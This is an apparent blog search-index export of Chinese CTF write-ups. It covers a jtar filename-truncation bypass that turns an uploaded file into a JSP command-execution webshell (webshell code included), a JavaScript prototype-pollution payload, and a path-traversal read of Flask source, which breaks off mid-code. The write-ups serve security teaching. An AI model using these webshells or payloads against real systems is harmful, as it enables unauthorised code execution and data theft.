<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>D^3CTF2025 d3jtar 出题及 WP</title>
    <link href="/2025/06/02/D3CTF-d3jtar%E5%87%BA%E9%A2%98%E5%8F%8AWP/"/>
    <url>/2025/06/02/D3CTF-d3jtar%E5%87%BA%E9%A2%98%E5%8F%8AWP/</url>
    
    <content type="html"><![CDATA[<h1 id="D-3CTF2025-d3jtar-出题及-WP"><a href="#D-3CTF2025-d3jtar-出题及-WP" class="headerlink" title="D^3CTF2025 d3jtar 出题及 WP"></a>D^3CTF2025 d3jtar 出题及 WP</h1><h1 id="阅前声明"><a href="#阅前声明" class="headerlink" title="阅前声明"></a>阅前声明</h1><p>本题由 <strong><a href="https://github.com/luelueking">1ue</a>师傅</strong>提供关键思路！感谢<strong>协会大佬</strong>们的帮助！</p><h1 id="d3jtar"><a href="#d3jtar" class="headerlink" title="d3jtar"></a>d3jtar</h1><p>jtar 是 java 中打 tar 包的常用库，它对文件名的处理存在一些问题，本题即围绕这一点在文件备份场景中展开，希望选手通过自行尝试、挖掘 jtar 工作细节来获取 flag。</p><p>题中的网站文件备份系统的 view 路由下配置了不安全的 jsp 解析，显然只要成功上传 jsp 文件即可 RCE。然而后端对上传文件的名称做了较为严格的校验，理想情况下选手无法通过其他手段绕过 secureUpload 校验来上传 jsp 文件。</p><p>那么结合题目名称，突破口就在于 jtar。我们来看一下 jtar 打包的工作流程：</p><p>从 <a href="https://github.com/kamranzafar/jtar">https://github.com/kamranzafar/jtar</a> 拉取源码，添加一个与题目基本一致的 Backup</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.kamranzafar.jtar;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.nio.charset.StandardCharsets;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Path;<br><span class="hljs-keyword">import</span> java.util.Collections;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Backup</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        tarDirectory(Path.of(<span class="hljs-string">&quot;1.tar&quot;</span>), Path.of(<span class="hljs-string">&quot;tmp/tar&quot;</span>));<br>        untar(Path.of(<span class="hljs-string">&quot;tmp/untar&quot;</span>), Path.of(<span class="hljs-string">&quot;1.tar&quot;</span>));<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">tarDirectory</span><span class="hljs-params">(Path outputFile, Path inputDirectory)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        tarDirectory(outputFile, inputDirectory, Collections.emptyList());<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">tarDirectory</span><span class="hljs-params">(Path outputFile, Path inputDirectory, List&lt;String&gt; pathPrefixesToExclude)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-comment">// Output file stream</span><br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">dest</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(outputFile.toFile());<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">Path</span> <span class="hljs-variable">outputFileAbsolute</span> <span class="hljs-operator">=</span> outputFile.normalize().toAbsolutePath();<br><br>        <span class="hljs-keyword">final</span> <span class="hljs-type">Path</span> <span class="hljs-variable">inputDirectoryAbsolute</span> <span class="hljs-operator">=</span> inputDirectory.normalize().toAbsolutePath();<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">inputPathLength</span> <span class="hljs-operator">=</span> inputDirectoryAbsolute.toString().length();<br><br>        <span class="hljs-comment">// Create a TarOutputStream</span><br>        <span class="hljs-keyword">try</span> (<span class="hljs-type">TarOutputStream</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TarOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedOutputStream</span>(dest))) &#123;<br>            Files.walk(inputDirectoryAbsolute).forEach(entry -&gt; &#123;<br>                <span class="hljs-keyword">if</span> (Files.isDirectory(entry))<br>                    <span class="hljs-keyword">return</span>;<br><br>                <span class="hljs-comment">// Don&#x27;t try to compress the output.tar file into itself</span><br>                <span class="hljs-keyword">if</span> (entry.equals(outputFileAbsolute))<br>                    <span class="hljs-keyword">return</span>;<br><br>                <span class="hljs-keyword">try</span> &#123;<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">relativeName</span> <span class="hljs-operator">=</span> entry.toString().substring(inputPathLength + <span class="hljs-number">1</span>);<br><br>                    out.putNextEntry(<span class="hljs-keyword">new</span> <span class="hljs-title class_">TarEntry</span>(entry.toFile(), relativeName));<br>                    <span class="hljs-type">BufferedInputStream</span> <span class="hljs-variable">origin</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(entry.toFile()));<br>                    <span class="hljs-type">int</span> count;<br>                    <span class="hljs-type">byte</span> data[] = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">2048</span>];<br><br>                    <span class="hljs-keyword">while</span> ((count = origin.read(data)) != -<span class="hljs-number">1</span>) &#123;<br>                        out.write(data, <span class="hljs-number">0</span>, count);<br>                    &#125;<br><br>                    out.flush();<br>                    origin.close();<br>                &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                    e.printStackTrace();<br>                &#125;<br>            &#125;);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">untar</span><span class="hljs-params">(Path outputDirectory, Path inputTarFile)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-keyword">try</span> (<span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fileInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(inputTarFile.toFile())) &#123;<br>            untar(outputDirectory, fileInputStream);<br>        &#125;<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">untar</span><span class="hljs-params">(Path outputDirectory, InputStream inputStream)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-keyword">try</span> (<span class="hljs-type">TarInputStream</span> <span class="hljs-variable">tarInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TarInputStream</span>(inputStream)) &#123;<br>            TarEntry entry;<br><br>            <span class="hljs-keyword">while</span> ((entry = tarInputStream.getNextEntry()) != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-type">int</span> count;<br>                <span class="hljs-type">byte</span> data[] = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">32768</span>];<br>                <span class="hljs-type">File</span> <span class="hljs-variable">outputFile</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(outputDirectory + <span class="hljs-string">&quot;/&quot;</span> + entry.getName());<br>                <span class="hljs-keyword">if</span> (!outputFile.getParentFile().isDirectory())<br>                    outputFile.getParentFile().mkdirs();<br><br>                <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(outputFile);<br>                <span class="hljs-type">BufferedOutputStream</span> <span class="hljs-variable">dest</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedOutputStream</span>(fos);<br><br>                <span class="hljs-keyword">while</span> ((count = tarInputStream.read(data)) != -<span class="hljs-number">1</span>) &#123;<br>                    dest.write(data, <span class="hljs-number">0</span>, count);<br>                &#125;<br><br>                dest.flush();<br>                dest.close();<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在 41 行 <code>out.putNextEntry(new TarEntry(entry.toFile(), relativeName));</code> 打下断点，并步入 <code>putNextEntry</code>，这里是在遍历压缩目录下所有文件时将每个文件的文件名等条目写入字节流。</p><p><img src="/img/D3CTF2025d3jtar%E5%87%BA%E9%A2%98%E5%8F%8AWP/RQE7bq7u0othz2xGrAzce3iKnLe.png"></p><p>随后步入 <code>entry.writeEntryHeader( header );</code></p><p><img src="/img/D3CTF2025d3jtar%E5%87%BA%E9%A2%98%E5%8F%8AWP/Nu43bWo5uo0olxxNoDIcMrrAnYg.png"></p><p>再步入 <code>offset = TarHeader.getNameBytes(header.name, outbuf, offset, TarHeader._NAMELEN_);</code>，<code>getNameBytes</code> 即是针对 <code>header</code> 中的文件名从 <code>StringBuffer</code> 向 <code>Bytes</code> 转换。</p><p><img src="/img/D3CTF2025d3jtar%E5%87%BA%E9%A2%98%E5%8F%8AWP/QSlnbDl6Toz1zxx3lDXcs51YnYf.png"></p><p>此处强制转换发生字符截断。</p><p><img src="/img/D3CTF2025d3jtar%E5%87%BA%E9%A2%98%E5%8F%8AWP/BLo8bnXrNoL1SmxTO7hc5QvJnkh.png"></p><p>后缀第一个字符为 2 字节的中文字符“剪”，抛弃高 8 位仅保留低 8 位，字符被截断为 ASCII 码 106 即 <code>j</code>，后两个字符同理。</p><p><img src="/img/D3CTF2025d3jtar%E5%87%BA%E9%A2%98%E5%8F%8AWP/HQWRbkexZojXSKxEWDucRzXanwh.png"></p><p>打包前及恢复后效果如图</p><p><img src="/img/D3CTF2025d3jtar%E5%87%BA%E9%A2%98%E5%8F%8AWP/Ty3pbUPBcohqIlx4L8scza7JnDf.png"></p><p>所以，我们可以将后缀带有特定 unicode 字符的文件上传至靶机，绕过后缀黑名单检查，通过备份与恢复功能将上传的文件转变为 jsp 后缀的文件，最终 RCE 获取 flag。</p><p>示例文件如下：</p><p>文件名：payload.陪sp –&gt; payload.jsp</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.*&quot;</span> %&gt;<br>&lt;%<br>    <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;printenv&quot;</span>;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">Process</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(cmd);<br>        <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">reader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(p.getInputStream()));<br>        String line;<br>        <span class="hljs-keyword">while</span> ((line = reader.readLine()) != <span class="hljs-literal">null</span>) &#123;<br>            output += line + <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        output = <span class="hljs-string">&quot;Error executing command: &quot;</span> + e.getMessage();<br>    &#125;<br>%&gt;<br><br>&lt;html&gt;<br>&lt;head&gt;&lt;title&gt;Command Output&lt;/title&gt;&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h2&gt;Executed Command: &lt;code&gt;&lt;%= cmd %&gt;&lt;/code&gt;&lt;/h2&gt;<br>&lt;pre&gt;&lt;%= output %&gt;&lt;/pre&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>解题所使用的 unicode 字符可以参考以下脚本获取，只要可以转换为正常后缀的 ASCII 字符即可，例如 <code>payload.멪ⅳば</code> 也是相同效果</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> unicodedata<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">reverse_search</span>(<span class="hljs-params">byte_value</span>):<br>    low_byte = byte_value &amp; <span class="hljs-number">0xFF</span><br>    candidates = []<br><br>    <span class="hljs-keyword">for</span> high <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x00</span>, <span class="hljs-number">0xFF</span> + <span class="hljs-number">1</span>):<br>        code_point = (high &lt;&lt; <span class="hljs-number">8</span>) | low_byte<br>        <span class="hljs-keyword">try</span>:<br>            char = <span class="hljs-built_in">chr</span>(code_point)<br>            name = unicodedata.name(char)<br>            candidates.append((<span class="hljs-string">f&quot;U+<span class="hljs-subst">&#123;code_point:04X&#125;</span>&quot;</span>, char, name))<br>        <span class="hljs-keyword">except</span> ValueError:<br>            <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">return</span> candidates<br><br>ascii_character = <span class="hljs-string">&quot;j&quot;</span>  <span class="hljs-comment"># &quot;s&quot;,&quot;p&quot;</span><br>byte_val = <span class="hljs-built_in">ord</span>(ascii_character)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Possible original characters (<span class="hljs-subst">&#123;byte_val&#125;</span> → 0x<span class="hljs-subst">&#123;byte_val &amp; <span class="hljs-number">0xFF</span>:02X&#125;</span>）:&quot;</span>)<br>results = reverse_search(byte_val)<br><span class="hljs-keyword">for</span> cp, char, name <span class="hljs-keyword">in</span> results:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;cp&#125;</span>: <span class="hljs-subst">&#123;char&#125;</span> - <span class="hljs-subst">&#123;name&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><p>另外，其实选手如果有心注意的话，在 jtar 的 github 项目里有一条 23 年的 pr（最上方），是关于中文编码错误的修改（其实问题不止中文，例如“멪”或者其他特殊字符，这条 pr 并未被合并），那么这或许可以作为一条潜在的 hint，至少能提醒选手 jtar 的编码处理可能有些问题，找到挖掘利用点的方向。</p><p>（<a href="https://github.com/kamranzafar/jtar/pull/36/commits/0fc08d31fe4bf0b0fad2f5a2f3acb3f5c14858ac">https://github.com/kamranzafar/jtar/pull/36/commits/0fc08d31fe4bf0b0fad2f5a2f3acb3f5c14858ac</a>）</p><p><img src="/img/D3CTF2025d3jtar%E5%87%BA%E9%A2%98%E5%8F%8AWP/GGYVbXPANoVuAdxOLdXclOOxnEe.png"></p><h1 id="赛事结果"><a href="#赛事结果" class="headerlink" title="赛事结果"></a>赛事结果</h1><p>d3jtar 的最终解数为 13 解。好消息是没有出现非预期。😉</p><p>在查看参赛队伍提交的 WP 时发现，有一支队伍（似乎当时并未发现可以绕过的根本原因）使用了略有不同的 payload，后缀为 <code>.jsp耀</code> –&gt; <code>.jsp</code>，当然本质原理是一样的，但刚好耀的 unicode 为 <code>\u8000</code>，截断后变为 <code>00</code></p><p>如需复现，可至仓库 <a href="https://github.com/5i1encee/D3CTF2025-d3jtar">https://github.com/5i1encee/D3CTF2025-d3jtar</a> 获取题目环境及附件</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>web</tag>
      
      <tag>WriteUp</tag>
      
      <tag>出题</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Mini L-CTF</title>
    <link href="/2025/05/15/Mini%20L-CTF/"/>
    <url>/2025/05/15/Mini%20L-CTF/</url>
    
    <content type="html"><![CDATA[<h1 id="Mini-L-CTF"><a href="#Mini-L-CTF" class="headerlink" title="Mini L-CTF"></a>Mini L-CTF</h1><h1 id="Clickclick"><a href="#Clickclick" class="headerlink" title="Clickclick"></a>Clickclick</h1><p>这题考点是 js 的原型链污染，之前没怎么接触过记录一下。</p><p>题目描述点击 10000 次出现不一样的东西，打开抓包多次点击发现每 50 次发一次包如下</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;set&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;point&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;amount&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">50</span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>修改 amount 值尝试 1000、10000 等参数，发现到达 1000 后均返回“你按的太快了！”</p><p>审计一下前端代码或者使用如下代码在控制台运行即可看到点击 10000 次的提示</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs json">but = document.querySelector(<span class="hljs-string">&quot;#app &gt; main &gt; div &gt; button&quot;</span>)<br>for (var i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++) <span class="hljs-punctuation">&#123;</span><br>    but.click();<br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/img/miniLCTF2025/I142bjCa8ofO3dx3KKpcGgwHnDe.png"></p><p>if ( req.body.point.amount &#x3D;&#x3D; 0 || req.body.point.amount &#x3D;&#x3D; null) { delete req.body.point.amount }</p><p>也就是说当传递的 amount 参数为 0 时会直接删除，结合后端语言为 JavaScript 所以考虑原型链污染，使用 payload 如下，删除后污染原型</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;set&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;point&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;amount&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;__proto__&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;amount&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">10000</span><br>    <span class="hljs-punctuation">&#125;</span><br>  <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h1 id="ezCC"><a href="#ezCC" class="headerlink" title="ezCC"></a>ezCC</h1><p>暂时没时间了，标记一下后续学习整理更新</p><p><a href="https://github.com/XDSEC/miniLCTF_2025/blob/main/OfficialWriteups/Web/ezCC_Official.pdf">https://github.com/XDSEC/miniLCTF_2025&#x2F;blob&#x2F;main&#x2F;OfficialWriteups&#x2F;Web&#x2F;ezCC_Official.pdf</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>web</tag>
      
      <tag>WriteUp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ACTF2025</title>
    <link href="/2025/05/15/ACTF2025/"/>
    <url>/2025/05/15/ACTF2025/</url>
    
    <content type="html"><![CDATA[<h1 id="ACTF2025"><a href="#ACTF2025" class="headerlink" title="ACTF2025"></a>ACTF2025</h1><p>简单记录其中部分题目</p><h1 id="ACTF-upload"><a href="#ACTF-upload" class="headerlink" title="ACTF upload"></a>ACTF upload</h1><p>这次都被 l1nk 师傅带飞哩</p><p>登录随便输入 username 和 password 即可进入上传页面，当 username 为 admin 时返回 500</p><p>发现存在任意文件读，可以目录穿越 <code>/upload?file_path=../app.py</code></p><p>返回的内容 base64 解密可得如下源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> uuid<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, redirect, url_for, flash, session<br><br>app = Flask(__name__)<br>app.secret_key = os.getenv(<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">if</span> session.get(<span class="hljs-string">&#x27;username&#x27;</span>):<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;upload&#x27;</span>))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;login&#x27;</span>))<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/login&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>, <span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        username = request.form[<span class="hljs-string">&#x27;username&#x27;</span>]<br>        password = request.form[<span class="hljs-string">&#x27;password&#x27;</span>]<br>        <span class="hljs-keyword">if</span> username == <span class="hljs-string">&#x27;admin&#x27;</span>:<br>            <span class="hljs-keyword">if</span> hashlib.sha256(<br>                    password.encode()).hexdigest() == <span class="hljs-string">&#x27;32783cef30bc23d9549623aa48aa8556346d78bd3ca604f277d63d6e573e8ce0&#x27;</span>:<br>                session[<span class="hljs-string">&#x27;username&#x27;</span>] = username<br>                <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;index&#x27;</span>))<br>            <span class="hljs-keyword">else</span>:<br>                flash(<span class="hljs-string">&#x27;Invalid password&#x27;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            session[<span class="hljs-string">&#x27;username&#x27;</span>] = username<br>            <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;index&#x27;</span>))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">        &lt;h1&gt;Login&lt;/h1&gt;</span><br><span class="hljs-string">        &lt;h2&gt;No need to register.&lt;/h2&gt;</span><br><span class="hljs-string">        &lt;form action=&quot;/login&quot; method=&quot;post&quot;&gt;</span><br><span class="hljs-string">            &lt;label for=&quot;username&quot;&gt;Username:&lt;/label&gt;</span><br><span class="hljs-string">            &lt;input type=&quot;text&quot; id=&quot;username&quot; name=&quot;username&quot; required&gt;</span><br><span class="hljs-string">            &lt;br&gt;</span><br><span class="hljs-string">            &lt;label for=&quot;password&quot;&gt;Password:&lt;/label&gt;</span><br><span class="hljs-string">            &lt;input type=&quot;password&quot; id=&quot;password&quot; name=&quot;password&quot; required&gt;</span><br><span class="hljs-string">            &lt;br&gt;</span><br><span class="hljs-string">            &lt;input type=&quot;submit&quot; value=&quot;Login&quot;&gt;</span><br><span class="hljs-string">        &lt;/form&gt;</span><br><span class="hljs-string">        &#x27;&#x27;&#x27;</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/upload&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>, <span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">upload</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> session.get(<span class="hljs-string">&#x27;username&#x27;</span>):<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;login&#x27;</span>))<br><br>    <span 